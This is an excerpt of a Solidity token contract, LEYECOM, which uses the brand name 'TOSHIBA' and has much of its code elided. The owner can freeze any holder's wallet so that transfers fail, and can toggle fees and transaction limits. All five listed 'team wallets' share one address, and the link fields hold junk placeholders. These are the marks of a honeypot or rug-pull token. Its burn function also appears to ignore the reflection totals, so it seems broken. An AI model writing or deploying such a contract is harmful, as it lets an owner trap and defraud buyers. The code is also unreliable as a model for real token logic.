...
contract LEYECOM is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 33000000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "TOSHIBA";
    ...
    address payable public marketingWallet =
        payable(0x37700f03F5547871809ee1a89cE135ca2bD7655e);
    ...
    uint256 public numTokensSellToAddToLiquidity = 330000000000 * 10**18;
    uint256 public _maxTxAmount =  3300000000000 * 10**18;
    ...
    constructor() {
        ...
        OurLinks.WebSite = "5"; //WebSite Link
        OurLinks.Telegram = "abuk"; //Telegram Link
        OurLinks.Twitter = "sub"; //Twitter Link
        OurLinks.Medium = "sub"; //Medium Link
        OurLinks.Github = "sub"; //Github Link
        OurLinks.Tiktok = "sub"; //Tiktok Link
        OurLinks.WhitePaper = "sas"; //Whitepaper Link
        OurLinks.LeyeSwap = "sub"; //LeyeSwap Link
        
        OurMissions.OurMission = "New"; //OurMission

        OurTeamWallets.Andrew = 0xffc6b1712670279752E00562A81D144608Cd922f; //OurMission
        OurTeamWallets.Churc = 0xffc6b1712670279752E00562A81D144608Cd922f; //OurMission
        OurTeamWallets.Johnson = 0xffc6b1712670279752E00562A81D144608Cd922f; //OurMission
        OurTeamWallets.Devton = 0xffc6b1712670279752E00562A81D144608Cd922f; //OurMission
        OurTeamWallets.LeyeLabs = 0xffc6b1712670279752E00562A81D144608Cd922f; //OurMission
    ...
    **/
    ...
    function unfreeze (address wallet) external onlyOwner {
        frozen[wallet] = false;
    }
    ...
    function _transfer(
        ...
        require (!frozen[from], "Your wallet is frozen, can't move tokens");
    ...
    function FeelessdayLeye() external  onlyOwner {
        ...
        _previousBurnFee = 0;
        _maxTxAmount = 3300000000000 * 10**18;
    ...
    function FeelingdayLeye() external  onlyOwner {
        ...
        _marketingFee = 3;
        _previousmarketingFee = _marketingFee;
        _marketingLiquifyFee = 2;
        _maxTxAmount = 3300000000000 * 10**18;
        setSwapAndLiquifyEnabled(true);
    }

    function _burn(address account, uint256 amount) internal { require(account != address(0), "BEP20: burn from the zero address"); _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance"); _tTotal = _tTotal.sub(amount); emit Transfer(account, address(0), amount); }

    

    function burn(uint _amount) public { _burn(msg.sender, _amount * 10**18); }
